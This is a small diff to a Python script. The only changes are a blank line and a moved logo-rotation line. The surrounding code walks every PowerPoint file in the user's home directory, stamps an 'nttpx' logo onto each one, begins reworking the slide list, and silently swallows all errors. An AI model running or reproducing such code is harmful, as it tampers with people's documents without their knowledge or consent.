@@ -8,6 +8,7 @@ def main():
     try:
         for path in pathlib.Path.home().glob("**/*.pptx"):
             edit_pptx(str(path))
+            
     except Exception:
         pass
 
@@ -19,9 +20,9 @@ def edit_pptx(path):
 
         top_slide = prs.slides[0]
         logo = top_slide.shapes.add_picture("nttpx_logo.png", 0, 0)
-        logo.rotation = 340
         logo.top = int((prs.slide_height - logo.height) * 0.75)
         logo.left = int((prs.slide_width - logo.width) * 0.95)
+        logo.rotation = 340
         
         for i in range(1, int(len(prs.slides) / 2)):
             xml_slides = prs.slides._sldIdLst
